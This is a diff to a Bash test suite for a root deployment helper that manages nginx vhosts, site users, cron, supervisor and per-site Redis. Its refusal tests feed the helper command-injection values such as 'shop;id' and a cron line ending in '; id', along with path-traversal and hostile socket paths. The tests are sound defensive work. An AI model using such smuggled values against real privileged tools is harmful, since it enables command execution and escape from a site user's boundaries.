+ok "rollback" "fastcgi_pass unix:/var/run/php/php8.4-fpm.sock;" vhost-set-socket example.com $SOCK /var/run/php/php8.4-fpm.sock
+ok "run/php default" "unix:/run/php/php8.3-fpm-shop_example.sock;" vhost-set-socket example.com /run/php/php8.3-fpm.sock /run/php/php8.3-fpm-shop_example.sock
 refuse "socket elsewhere" "invalid PHP-FPM socket" vhost-set-socket example.com /var/run/php/php8.4-fpm.sock /tmp/evil.sock
-refuse "socket with .." "invalid PHP-FPM socket" vhost-set-socket example.com /run/php/../php8.4-fpm.sock /run/php/php8.4-fpm-eeploi.sock
-refuse "socket with a semicolon" "invalid PHP-FPM socket" vhost-set-socket example.com '/run/php/php8.4-fpm.sock;' /run/php/php8.4-fpm-eeploi.sock
+refuse "socket with .." "invalid PHP-FPM socket" vhost-set-socket example.com /run/php/../php8.4-fpm.sock $SOCK
+refuse "socket with a semicolon" "invalid PHP-FPM socket" vhost-set-socket example.com '/run/php/php8.4-fpm.sock;' $SOCK
 refuse "socket other pool" "invalid PHP-FPM socket" vhost-set-socket example.com /run/php/php8.4-fpm.sock /run/php/php8.4-fpm-root.sock
+refuse "socket of the old eeploi pool" "invalid PHP-FPM socket" vhost-set-socket example.com /run/php/php8.4-fpm.sock /run/php/php8.4-fpm-eeploi.sock
+refuse "socket of an unlisted user" "invalid PHP-FPM socket: /run/php/php8.4-fpm-alex.sock (alex is not an eeploi site user)" \
+  vhost-set-socket example.com /run/php/php8.4-fpm.sock /run/php/php8.4-fpm-alex.sock
+refuse "socket of a listed user in sudo" "invalid PHP-FPM socket" vhost-set-socket example.com /run/php/php8.4-fpm.sock /run/php/php8.4-fpm-shop_sudo.sock
 refuse "same socket" "same socket" vhost-set-socket example.com /run/php/php8.4-fpm.sock /run/php/php8.4-fpm.sock
-refuse "socket domain" "invalid domain" vhost-set-socket 'example.com;id' /run/php/php8.4-fpm.sock /run/php/php8.4-fpm-eeploi.sock
+refuse "socket domain" "invalid domain" vhost-set-socket 'example.com;id' /run/php/php8.4-fpm.sock $SOCK
 refuse "socket arguments" "usage" vhost-set-socket example.com /run/php/php8.4-fpm.sock
 
 echo "== self-update"
@@ -591,13 +675,16 @@ refuse "socket: reserved postgres" "reserved user name: postgres" db-create pgsq
 ok "socket login logs engine, name, user and login" $'log: eeploi-helper: eeploi: db-create mysql shop_example shop_example socket\n' db-create mysql $S $S socket
 
 echo "== db-create stdin: an open pipe and a terminal"
+# The dry-run environment for timeout and script: the default fixtures, as call uses them.
+HELPER_ENV=(EEPLOI_HELPER_DRY_RUN=1 SUDO_USER=eeploi EEPLOI_HELPER_ETC="$WORK/etc-sites"
+  EEPLOI_HELPER_NGINX_CONF="$WORK/nginx-default.conf" EEPLOI_HELPER_SYSTEM="$WORK/system")
 # helper_cmd <args...>: the dry-run helper as a command line, for timeout and script.
-helper_cmd() { printf '%q ' env -i PATH="$PATH" EEPLOI_HELPER_DRY_RUN=1 SUDO_USER=eeploi bash "$HELPER" "$@"; }
+helper_cmd() { printf '%q ' env -i PATH="$PATH" "${HELPER_ENV[@]}" bash "$HELPER" "$@"; }
 if command -v timeout > /dev/null; then
   # A pipe that is open but never written or closed: socket login must not read it, so it ends.
   mkfifo "$WORK/open-pipe"
   exec 3<> "$WORK/open-pipe"
-  OUT=$(timeout 10 env -i PATH="$PATH" EEPLOI_HELPER_DRY_RUN=1 SUDO_USER=eeploi bash "$HELPER" db-create mysql $S $S socket <&3 2>&1)
+  OUT=$(timeout 10 env -i PATH="$PATH" "${HELPER_ENV[@]}" bash "$HELPER" db-create mysql $S $S socket <&3 2>&1)
   CODE=$?
   if [ "$CODE" -eq 0 ] && [[ $OUT == *"(socket login)"* ]]; then pass; else failure "socket login does not read an open pipe" "exit $CODE
 $OUT"; fi
@@ -610,7 +697,7 @@ tty_call() {
   if script --version 2> /dev/null | grep -q util-linux; then
     OUT=$(timeout 10 script -qec "$(helper_cmd "$@")" /dev/null < /dev/null 2>&1)
   else
-    OUT=$(timeout 10 script -q /dev/null env -i PATH="$PATH" EEPLOI_HELPER_DRY_RUN=1 SUDO_USER=eeploi bash "$HELPER" "$@" < /dev/null 2>&1)
+    OUT=$(timeout 10 script -q /dev/null env -i PATH="$PATH" "${HELPER_ENV[@]}" bash "$HELPER" "$@" < /dev/null 2>&1)
   fi
   CODE=$?
 }
@@ -621,9 +708,223 @@ $OUT"; fi
   tty_call db-create mysql $S $S socket
   if [ "$CODE" -eq 0 ] && [[ $OUT == *"(socket login)"* ]]; then pass; else failure "socket login with a terminal" "exit $CODE
 $OUT"; fi
+  tty_call run-as shop_example
+  if [ "$CODE" -eq 64 ] && [[ $OUT == *"run-as needs the script on stdin, not a terminal"* ]]; then pass; else failure "run-as refuses a terminal" "exit $CODE
+$OUT"; fi
 else
   echo "note: script or timeout is not installed, terminal tests skipped (CI runs them)"
 fi
+
+echo "== site users: the check every site subcommand trusts"
+# run-as shows site_user best: it does nothing else before runuser.
+ok "a listed site user" "run: runuser -u shop_example" run-as shop_example
+ok "a registry with a comment and an empty line" "run: runuser -u shop" run-as shop
+for reserved in root eeploi ubuntu ploi forge postgres mysql redis nobody; do
+  refuse "run-as $reserved" "reserved name, not a site user: $reserved" run-as "$reserved"
+done
+# www-data has a hyphen, so the name check already refuses it.
+refuse "run-as www-data" "invalid site user: www-data" run-as www-data
+AS=deploy ETC_DIR="$WORK/etc-conf" refuse "run-as the deploy user" "reserved name, not a site user: deploy" run-as deploy
+NGINX="$WORK/nginx-group.conf" refuse "run-as the nginx user" "reserved name, not a site user: nginx" run-as nginx
+for bad in Shop shop-example shop.example '1shop' '_shop' '' a23456789012345678901234567890123 'shop;id' $'shop\nid' '../shop'; do
+  refuse "site user name '$bad'" "invalid site user" run-as "$bad"
+done
+refuse "an unlisted user" "alex is not an eeploi site user (not in $WORK/etc-sites/sites)" run-as alex
+refuse "a listed user in sudo" "shop_sudo is in other groups too (ids 1004 27), not a site user" run-as shop_sudo
+refuse "a uid below 1000" "shop_low is a system user (uid 999), not a site user" run-as shop_low
+refuse "a home outside /srv/eeploi" "shop_away has home /home/shop_away, not /srv/eeploi/shop_away" run-as shop_away
+refuse "a primary group not its own" "the group of shop_group is not its own group shop_group" run-as shop_group
+refuse "listed, but no Linux user" "no Linux user shop_half on this server" run-as shop_half
+SYS='' refuse "no Linux user at all" "no Linux user shop_example on this server" run-as shop_example
+ETC_DIR="$WORK/etc-reg-writable" refuse "registry writable by others" "untrusted site registry" run-as shop_example
+ETC_DIR="$WORK/etc-reg-link" refuse "registry as a link" "untrusted site registry" run-as shop_example
+ETC_DIR="$WORK/etc-reg-folder" refuse "registry folder writable by others" "untrusted site registry" run-as shop_example
+ETC_DIR="$WORK/etc-reg-badline" refuse "registry with another line" "invalid line in" run-as shop_example
+ETC_DIR="$WORK/etc-reg-inject" refuse "registry with a command" "invalid line in" run-as shop_example
+ETC_DIR="$WORK/etc-reg-twice" refuse "registry with DOMAIN twice" "DOMAIN is set twice" run-as shop_example
+ETC_DIR="$WORK/etc-reg-nodomain" refuse "registry without DOMAIN" "no DOMAIN in" run-as shop_example
+ETC_DIR="$WORK/etc-reg-baddomain" refuse "registry with a bad DOMAIN" "invalid domain: shop" run-as shop_example
+
+echo "== site-user-create"
+ok "the registry first" "  DOMAIN=new.example
+  HOME=/srv/eeploi/shop_new
+write: $WORK/etc-sites/sites/shop_new (644)" "${NEW[@]}"
+ok "useradd" "run: useradd --home-dir /srv/eeploi/shop_new --create-home --user-group --shell /usr/sbin/nologin shop_new" "${NEW[@]}"
+ok "then checks the new user" "check: site user shop_new (uid 1000 or higher, home /srv/eeploi/shop_new, only its own group)" "${NEW[@]}"
+ok "home 750, then the ACL" "run: chmod 750 /srv/eeploi/shop_new
+run: setfacl -m u:www-data:x /srv/eeploi/shop_new" "${NEW[@]}"
+ok "created" "created: site user shop_new for new.example, home /srv/eeploi/shop_new" "${NEW[@]}"
+lacks "/srv/eeploi kept when there" "install -d -o root -g root -m 755 /srv/eeploi" "${NEW[@]}"
+grep -v '^path /srv/eeploi$' "$WORK/system" > "$WORK/system-no-srv"
+SYS="$WORK/system-no-srv" ok "/srv/eeploi made when missing" "run: install -d -o root -g root -m 755 /srv/eeploi
+run: useradd" "${NEW[@]}"
+ETC_DIR="$WORK/etc-empty" ok "the registry folder made when missing" "run: install -d -o root -g root -m 755 $WORK/etc-empty/sites" "${NEW[@]}"
+for text in 'chown' 'chmod -R' 'setfacl -R' '/srv/eeploi/shop_new/'; do
+  lacks "root touches only the home itself: no $text" "$text" "${NEW[@]}"
+done
+ok "a second call changes nothing" "exists: site user shop_example for shop.example, nothing changed" site-user-create shop_example shop.example
+ok "a second call sets the home again" "run: chmod 750 /srv/eeploi/shop_example
+run: setfacl -m u:www-data:x /srv/eeploi/shop_example" site-user-create shop_example shop.example
+lacks "a second call makes no user" "useradd" site-user-create shop_example shop.example
+lacks "a second call writes no registry" "write:" site-user-create shop_example shop.example
+ok "a half-made site user gets its user" "run: useradd --home-dir /srv/eeploi/shop_half" site-user-create shop_half half.example
+lacks "a half-made site user keeps its registry" "write:" site-user-create shop_half half.example
+refuse "a second call for a site user in sudo" "in other groups too" site-user-create shop_sudo sudo.example
+refuse "an existing user that isn't listed" "alex exists (a user, group or /srv/eeploi/alex) and is not an eeploi site user" site-user-create alex alex.example
+refuse "an existing group that isn't listed" "shop_staff exists (a user, group or /srv/eeploi/shop_staff) and is not an eeploi site user" site-user-create shop_staff staff.example
+refuse "an existing home that isn't listed" "shop_left exists (a user, group or /srv/eeploi/shop_left) and is not an eeploi site user" site-user-create shop_left left.example
+call site-user-create alex alex.example
+if [ "$CODE" -eq 64 ] && [[ $OUT != *"write:"* && $OUT != *"run:"* ]]; then pass; else failure "nothing written or run for an existing user" "exit $CODE
+$OUT"; fi
+refuse "a domain listed for another user" "shop.example is listed for site user shop_example" site-user-create shop_new shop.example
+refuse "a listed user for another domain" "site user shop_example is for shop.example, not new.example" site-user-create shop_example new.example
+for reserved in root eeploi ubuntu ploi forge postgres mysql redis nobody; do
+  refuse "site-user-create $reserved" "reserved name, not a site user: $reserved" site-user-create "$reserved" new.example
+done
+refuse "site-user-create www-data" "invalid site user: www-data" site-user-create www-data new.example
+for bad in Shop shop-new '1shop' '' a23456789012345678901234567890123 'shop;id'; do
+  refuse "site-user-create name '$bad'" "invalid site user" site-user-create "$bad" new.example
+done
+refuse "site-user-create bad domain" "invalid domain" site-user-create shop_new 'new.example;id'
+refuse "site-user-create arguments" "usage" site-user-create shop_new
+refuse "site-user-create extra argument" "usage" site-user-create shop_new new.example x
+AS=ploi refuse "site-user-create from ploi" "site-user-create only runs for the deploy user eeploi, not ploi" "${NEW[@]}"
+AS=forge refuse "site-user-create from forge" "only runs for the deploy user eeploi, not forge" "${NEW[@]}"
+AS=deploy ETC_DIR="$WORK/etc-conf" ok "site-user-create from the configured deploy user" "created: site user shop_new" "${NEW[@]}"
+ETC_DIR="$WORK/etc-conf" refuse "site-user-create from eeploi when another user deploys" "only runs for the deploy user deploy, not eeploi" "${NEW[@]}"
+ETC_DIR="$WORK/etc-reg-writable" refuse "an untrusted registry stops site-user-create" "untrusted site registry" "${NEW[@]}"
+
+echo "== run-as"
+ok "exact runuser line" "run: runuser -u shop_example -- env -i HOME=/srv/eeploi/shop_example USER=shop_example LOGNAME=shop_example PATH=/usr/local/bin:/usr/bin:/bin LANG=C.UTF-8 /bin/bash -s" run-as shop_example
+IN=$'id\nwhoami\n' ok "the script stays off the log" $'log: eeploi-helper: eeploi: run-as shop_example\n' run-as shop_example
+IN=$'secret-marker-line\n' lacks "the script is never printed" "secret-marker-line" run-as shop_example
+AS=ploi refuse "run-as from ploi" "run-as only runs for the deploy user eeploi, not ploi" run-as shop_example
+AS=forge refuse "run-as from forge" "run-as only runs for the deploy user eeploi, not forge" run-as shop_example
+refuse "run-as without a user" "usage: run-as <user> < script" run-as
+refuse "run-as with a command" "usage" run-as shop_example id
+refuse "run-as with extra arguments" "usage" run-as shop_example -- bash -c id
+AS=deploy ETC_DIR="$WORK/etc-conf" ok "run-as from the configured deploy user" "run: runuser -u shop_example" run-as shop_example
+
+echo "== site subcommands: only the site user's own domain and home"
+ok "vhost socket built by the helper" "fastcgi_pass unix:/run/php/php8.4-fpm-shop_example.sock;" vhost-write shop.example shop_example 8.4
+ok "vhost in the registry" "  VHOST=/etc/nginx/sites-available/shop.example
+write: $WORK/etc-sites/sites/shop_example (644)" vhost-write shop.example shop_example 8.4
+ok "the registry keeps its other lines" "  DOMAIN=shop.example
+  HOME=/srv/eeploi/shop_example
+  CRON=/etc/cron.d/eeploi-shop_example" vhost-write shop.example shop_example 8.4
+refuse "vhost for a domain that isn't the user's" "site user shop_example is for shop.example, not other.example" vhost-write other.example shop_example 8.4
+refuse "vhost for an unlisted user" "alex is not an eeploi site user" vhost-write shop.example alex 8.4
+refuse "vhost for the deploy user" "reserved name, not a site user: eeploi" vhost-write shop.example eeploi 8.4
+refuse "vhost old arguments" "usage" vhost-write shop.example /run/php/php8.4-fpm-eeploi.sock
+IN=$CRON_LINE ok "cron line" "  * * * * * shop_example php8.4 /srv/eeploi/shop_example/shop.example/current/artisan schedule:run > /dev/null 2>&1
+write: /etc/cron.d/eeploi-shop_example (644)" cron-write shop_example
+IN=$'* * * * * shop_example php /srv/eeploi/shop_example/shop.example/current/artisan schedule:run > /dev/null 2>&1\n' \
+  ok "cron line without a PHP version" "write: /etc/cron.d/eeploi-shop_example (644)" cron-write shop_example
+IN=$CRON_LINE ok "cron in the registry" "  CRON=/etc/cron.d/eeploi-shop_example
+  REDIS_CONF=" cron-write shop_example
+IN=$'* * * * * shop_example php8.4 /srv/eeploi/shop_example/other.example/current/artisan schedule:run > /dev/null 2>&1\n' \
+  refuse "cron for a domain that isn't the user's" "only" cron-write shop_example
+IN=$'* * * * * shop_other php8.4 /srv/eeploi/shop_other/other.example/current/artisan schedule:run > /dev/null 2>&1\n' \
+  refuse "cron as another site user" "only" cron-write shop_example
+IN=$'* * * * * shop_example php8.4 /srv/eeploi/shop_example/shopXexample/current/artisan schedule:run > /dev/null 2>&1\n' \
+  refuse "cron: dots in the path are dots" "only" cron-write shop_example
+IN=$'* * * * * shop_example php8.4 /srv/eeploi/shop_example/shop.example/current/artisan schedule:run > /dev/null 2>&1; id\n' \
+  refuse "cron with more after the line" "only" cron-write shop_example
+IN=$CRON_LINE refuse "cron for an unlisted user" "alex is not an eeploi site user" cron-write alex
+IN=$CRON_LINE refuse "cron old arguments" "invalid site user: shop.example" cron-write shop.example
+ok "cron-remove takes it out of the registry" "  HOME=/srv/eeploi/shop_example
+  REDIS_CONF=" cron-remove shop_example
+lacks "cron-remove leaves no CRON line" "CRON=" cron-remove shop_example
+refuse "cron-remove for an unlisted user" "alex is not an eeploi site user" cron-remove alex
+SUP=(supervisor-write eeploi-shop.example-a shop_example "$SITE/current" 1)
+IN='php artisan horizon' ok "supervisor directory" "directory=$SITE/current" "${SUP[@]}"
+IN='php artisan horizon' ok "supervisor log folder" "run: install -d -o root -g shop_example -m 750 /var/log/supervisor/eeploi/shop_example" "${SUP[@]}"
+IN='php artisan horizon' ok "supervisor in the registry" "  SUPERVISOR=/etc/supervisor/conf.d/eeploi-shop.example-a.conf
+  LOGS=/var/log/supervisor/eeploi/shop_example
+write: $WORK/etc-sites/sites/shop_example (644)" "${SUP[@]}"
+IN='id' refuse "supervisor for a domain that isn't the user's" "the program of site user shop_example must start with eeploi-shop.example-" \
+  supervisor-write eeploi-other.example-a shop_example $SITE/current 1
+IN='id' refuse "supervisor program of just the domain" "must start with eeploi-shop.example-" supervisor-write eeploi-shop.example- shop_example $SITE/current 1
+IN='id' refuse "supervisor directory of another site" "not in $SITE" supervisor-write eeploi-shop.example-a shop_example /srv/eeploi/shop_other/other.example/current 1
+IN='id' refuse "supervisor directory of another domain" "not in $SITE" supervisor-write eeploi-shop.example-a shop_example /srv/eeploi/shop_example/other.example/current 1
+IN='id' refuse "supervisor directory with .." "invalid path" supervisor-write eeploi-shop.example-a shop_example $SITE/../../shop_other 1
+IN='id' refuse "supervisor for an unlisted user" "alex is not an eeploi site user" supervisor-write eeploi-shop.example-a alex $SITE/current 1
+IN='id' refuse "supervisor old arguments" "usage" supervisor-write eeploi-shop.example-a $SITE/current 1
+printf 'SUPERVISOR=/etc/supervisor/conf.d/eeploi-shop.example-a.conf\n' >> "$WORK/etc-sites/sites/shop_other"
+IN='id' refuse "supervisor program listed for another site" "eeploi-shop.example-a belongs to site user shop_other" "${SUP[@]}"
+ok "supervisor-remove takes it out of the registry" "write: $WORK/etc-sites/sites/shop_other (644)" supervisor-remove eeploi-shop.example-a
+lacks "supervisor-remove leaves no line" "SUPERVISOR=" supervisor-remove eeploi-shop.example-a
+printf 'DOMAIN=other.example\n' > "$WORK/etc-sites/sites/shop_other"
+lacks "supervisor-remove of an unlisted program" "write:" supervisor-remove eeploi-shop.example-b
+refuse "env-install to another user's home" "not in /srv/eeploi/shop_example" env-install /home/ploi/a/.env /srv/eeploi/shop_other/other.example/.env shop_example
+refuse "env-install as an unlisted owner" "alex is not an eeploi site user" env-install /home/ploi/a/.env /srv/eeploi/alex/a/.env alex
+refuse "env-install to the deploy user's home" "not in /srv/eeploi/shop_example" env-install /home/ploi/a/.env /home/eeploi/a/.env shop_example
+refuse "env-install to the site home with .." "invalid path" env-install /home/ploi/a/.env $SITE/../../shop_other/x/.env shop_example
+refuse "storage-copy to another user's home" "not in /srv/eeploi/shop_example" storage-copy /home/ploi/a/storage /srv/eeploi/shop_other/other.example/storage shop_example
+ok "vhost-set-root into a site home" "root $SITE/current/public;" vhost-set-root shop.example /home/ploi/shop.example/public $SITE/current/public
+refuse "vhost-set-root into an unlisted home" "alex is not an eeploi site user" vhost-set-root shop.example /home/ploi/x/public /srv/eeploi/alex/a/public
+refuse "vhost-set-root elsewhere in /srv" "outside the allowed home folders" vhost-set-root shop.example /home/ploi/x/public /srv/public
+refuse "db-create socket login for an unlisted user" "alex is not an eeploi site user" db-create mysql alex alex socket
+refuse "db-create socket login for a site user in sudo" "in other groups too" db-create pgsql shop_sudo shop_sudo socket
+IN=$PW ok "db-create password login needs no site user" "created: mysql database alex for user alex (password login)" db-create mysql alex alex password
+
+echo "== Redis per site"
+ok "redis unit" "write: /etc/systemd/system/eeploi-redis@.service (644)" redis-create shop_example
+ok "redis unit runs as the site user" "  User=%i
+  Group=%i
+  ExecStart=/usr/bin/redis-server /etc/eeploi/redis/%i.conf --supervised systemd --daemonize no" redis-create shop_example
+ok "redis config" "  port 0
+  unixsocket /srv/eeploi/shop_example/.redis/redis.sock
+  unixsocketperm 600
+  dir /srv/eeploi/shop_example/.redis
+  appendonly yes
+  maxmemory 128mb
+  maxmemory-policy noeviction
+write: $WORK/etc-sites/redis/shop_example.conf (644)" redis-create shop_example
+ok "redis drop-in" "  [Service]
+  MemoryMax=164M
+write: /etc/systemd/system/eeploi-redis@shop_example.service.d/memory.conf (644)" redis-create shop_example
+ok "redis reload" "run: systemctl daemon-reload" redis-create shop_example
+ok "redis folder made by the site user" "run: runuser -u shop_example -- install -d -m 700 /srv/eeploi/shop_example/.redis" redis-create shop_example
+ok "redis in the registry" "  REDIS_CONF=$WORK/etc-sites/redis/shop_example.conf
+  REDIS_UNIT=eeploi-redis@shop_example.service
+  REDIS_DROPIN=/etc/systemd/system/eeploi-redis@shop_example.service.d/memory.conf
+  REDIS_SOCKET=/srv/eeploi/shop_example/.redis/redis.sock" redis-create shop_example
+ok "redis prepared, stopped" "prepared: Redis of site user shop_example, 128 MB, stopped" redis-create shop_example
+for text in 'systemctl start' 'systemctl enable' 'systemctl restart' 'enable --now'; do
+  lacks "redis-create starts nothing: no $text" "$text" redis-create shop_example
+done
+for text in 'chown' 'install -d -o root -g root -m 755 /srv'; do
+  lacks "redis-create: root writes nothing in the home: no $text" "$text" redis-create shop_example
+done
+ok "redis size 32" "  maxmemory 32mb" redis-create shop_example 32
+ok "redis cap at 32" "  MemoryMax=68M" redis-create shop_example 32
+ok "redis size 1024" "  maxmemory 1024mb" redis-create shop_example 1024
+ok "redis cap at 1024" "  MemoryMax=1060M" redis-create shop_example 1024
+ok "redis size 256" "prepared: Redis of site user shop_example, 256 MB" redis-create shop_example 256
+SYS="$WORK/system-redis-on" ok "a running Redis restarts on a new size" "run: systemctl restart eeploi-redis@shop_example
+prepared: Redis of site user shop_example, 64 MB, restarted" redis-create shop_example 64
+SYS="$WORK/system-no-redis" ok "redis-create without redis-server" "prepared: Redis of site user shop_example" redis-create shop_example
+for bad in 31 1025 0 64mb 64.5 ' 64' 064 -64 '' 1e3 'x'; do
+  refuse "redis size '$bad'" "the Redis size must be a whole number of MB from 32 to 1024: $bad" redis-create shop_example "$bad"
+done
+refuse "redis-create extra argument" "usage" redis-create shop_example 64 x
+ok "redis-start" "run: systemctl enable --now eeploi-redis@shop_example" redis-start shop_example
+ok "redis-stop" "run: systemctl disable --now eeploi-redis@shop_example" redis-stop shop_example
+refuse "redis-start before redis-create" "no Redis for site user shop_other yet: run redis-create first" redis-start shop_other
+SYS="$WORK/system-no-redis" refuse "redis-start without redis-server" "Redis is not installed on this server (no /usr/bin/redis-server): install the redis-server package first" redis-start shop_example
+for sub in redis-create redis-start redis-stop; do
+  refuse "$sub for an unlisted user" "alex is not an eeploi site user" "$sub" alex
+  for reserved in root eeploi redis; do
+    refuse "$sub for $reserved" "reserved name, not a site user: $reserved" "$sub" "$reserved"
+  done
+  refuse "$sub for www-data" "invalid site user: www-data" "$sub" www-data
+  refuse "$sub for a site user in sudo" "in other groups too" "$sub" shop_sudo
+  refuse "$sub without a user" "usage" "$sub"
+  AS=ploi refuse "$sub from ploi" "$sub only runs for the deploy user eeploi, not ploi" "$sub" shop_example
+done
+refuse "redis-start extra argument" "usage" redis-start shop_example now
+refuse "redis-stop extra argument" "usage" redis-stop shop_example now
 
 echo "== system log"
 ok "logs the call" "log: eeploi-helper: eeploi: vhost-enable example.com" vhost-enable example.com
